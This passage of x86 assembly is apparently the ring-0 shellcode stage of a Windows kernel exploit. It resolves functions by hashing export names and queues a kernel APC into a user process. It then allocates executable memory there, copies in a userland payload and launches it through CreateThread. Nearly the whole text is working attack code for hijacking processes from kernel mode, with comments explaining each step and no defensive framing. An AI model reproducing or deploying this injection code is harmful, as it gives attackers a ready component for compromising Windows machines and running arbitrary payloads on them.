    ; manual remove list without lock
    mov [eax], eax
    mov [eax+4], eax
    jmp _insert_queue_apc_loop

_insert_queue_apc_done:
    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.

_r3_to_r0_done:
    ret

;========================================================================
; Call function in specific module
; 
; All function arguments are passed as calling normal function with extra register arguments
; Extra Arguments: [ebp+DATA_MODULE_ADDR_OFFSET] = module pointer
;                  eax = hash of target function name
;========================================================================
win_api_direct:
    call get_proc_addr
    jmp eax


;========================================================================
; Get function address in specific module
; 
; Arguments: [ebp+DATA_MODULE_ADDR_OFFSET] = module pointer
;            eax = hash of target function name
; Return: eax = offset
;========================================================================
get_proc_addr:
    pushad

    mov ebp, [ebp+DATA_MODULE_ADDR_OFFSET]   ; ebp = module address
    xchg edi, eax   ; edi = hash
    
    mov eax, dword [ebp+0x3c]  ; Get PE header e_lfanew
    mov edx, dword [ebp+eax+0x78] ; Get export tables RVA

    add edx, ebp    ; edx = EAT

    mov ecx, dword [edx+0x18]  ; NumberOfFunctions
    mov ebx, dword [edx+0x20]  ; FunctionNames
    add ebx, ebp

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [ebx+ecx*4]  ; Get rva of next module name
    add esi, ebp                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    mov ebx, dword [edx+0x24]
    add ebx, ebp                ; ordinate table virtual address
    mov cx, word [ebx+ecx*2]    ; desired functions ordinal
    mov ebx, dword [edx+0x1c]   ; Get the function addresses table rva
    add ebx, ebp                ; Add the modules base address
    mov eax, dword [ebx+ecx*4]  ; Get the desired functions RVA
    add eax, ebp                ; Add the modules base address to get the functions actual VA

    mov [esp+0x1c], eax
    popad
    ret

;========================================================================
; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
; 
; Argument: esi = string to hash
; Clobber: esi
; Return: eax = hash
;========================================================================
calc_hash:
    push edx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop edx
    ret



; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.
; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().
; Moreover, there is no lock when calling KernelApcRoutine.
;
; VOID KernelApcRoutine(
;           IN PKAPC Apc,
;           IN PKNORMAL_ROUTINE *NormalRoutine,
;           IN PVOID *NormalContext,
;           IN PVOID *SystemArgument1,
;           IN PVOID *SystemArgument2)
kernel_kapc_routine:
    ; reorder stack to make everything easier
    pop eax
    mov [esp+0x10], eax    ; move saved eip to &SystemArgument2
    pop eax     ; PKAPC (unused)
    pop ecx     ; &NormalRoutine
    pop eax     ; &NormalContext
    pop edx     ; &SystemArgument1
    
    pushad
    push edx    ; &SystemArgument1 (use for set CreateThread address)
    push ecx    ; &NormalRoutine
    
    mov ebp, [eax]      ; *NormalContext is our data area pointer

    ;======================================
    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)
    ;======================================
    xor eax, eax
    mov byte [fs:0x24], al	; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)
    cdq
    
    mov al, 0x40    ; eax = 0x40
    push eax            ; PAGE_EXECUTE_READWRITE = 0x40
    shl eax, 6      ; eax = 0x40 << 6 = 0x1000
    push eax            ; MEM_COMMIT = 0x1000
    push esp            ; &RegionSize = 0x1000 (reuse MEM_COMMIT argument in stack)
    push edx            ; ZeroBits
    mov [ecx], edx
    push ecx            ; baseAddr = 0
    dec edx
    push edx            ; ProcessHandle = -1
    mov eax, ZWALLOCATEVIRTUALMEMORY_HASH
    call win_api_direct
%ifndef COMPACT
    test eax, eax
    jnz _kernel_kapc_routine_exit
%endif
    
    ;======================================
    ; copy userland payload
    ;======================================
    pop eax
    mov edi, [eax]
    call _kernel_kapc_routine_find_userland
_kernel_kapc_routine_find_userland:
    pop esi
    add esi, userland_start-_kernel_kapc_routine_find_userland
    mov ecx, 0x400  ; fix payload size to 1024 bytes
    rep movsb
    
    ;======================================
    ; find current PEB
    ;======================================
    mov eax, [ebp+DATA_EPROCESS_OFFSET]
    push eax
    mov eax, PSGETPROCESSPEB_HASH
    call win_api_direct
    
    ;======================================
    ; find CreateThread address (in kernel32.dll)
    ;======================================
    mov eax, [eax + 0xc]        ; PEB->Ldr
    mov eax, [eax + 0x14]       ; InMemoryOrderModuleList

%ifdef COMPACT
    mov esi, [eax]      ; first one always be executable, skip it
    lodsd               ; skip ntdll.dll
%else
_find_kernel32_dll_loop:
    mov eax, [eax]       ; first one always be executable
    ; offset 0x1c (WORD)  => must be 0x40 (full name len c:\windows\system32\kernel32.dll)
    ; offset 0x24 (WORD)  => must be 0x18 (name len kernel32.dll)
    ; offset 0x28  => is name
    ; offset 0x10  => is dllbase
    ;cmp word [eax+0x1c], 0x40
    ;jne _find_kernel32_dll_loop
    cmp word [eax+0x24], 0x18
    jne _find_kernel32_dll_loop
    
    mov edx, [eax+0x28]
    ; check only "32" because name might be lowercase or uppercase
    cmp dword [edx+0xc], 0x00320033   ; 3\x002\x00
    jnz _find_kernel32_dll_loop
%endif
    
    mov ebx, [eax+0x10]
    mov [ebp+DATA_MODULE_ADDR_OFFSET], ebx
    mov eax, CREATETHREAD_HASH
    call get_proc_addr

    ; save CreateThread address to SystemArgument1
    pop ecx
    mov [ecx], eax
    
_kernel_kapc_routine_exit:
    xor eax, eax
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [ebp+DATA_QUEUEING_KAPC_OFFSET], al
    ; restore IRQL to APC_LEVEL
    inc eax
    mov byte [fs:0x24], al
    
    popad
    ret

  
userland_start:
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    pop edx     ; saved eip
    pop eax     ; first argument (NormalContext)
    pop eax     ; CreateThread address passed from kernel
    pop ecx     ; another argument (NULL) passed from kernel
    push ecx        ; lpThreadId = NULL
    push ecx        ; dwCreationFlags = 0
    push ecx        ; lpParameter = NULL
    call _userland_start_thread_find_payload
_userland_start_thread_find_payload:
    add dword [esp], userland_payload-_userland_start_thread_find_payload    ; lpStartAddr
    push ecx        ; dwStackSize = 0
    push ecx        ; lpThreadAttributes = NULL
    push edx    ; restore saved eip
    jmp eax
    
userland_payload:
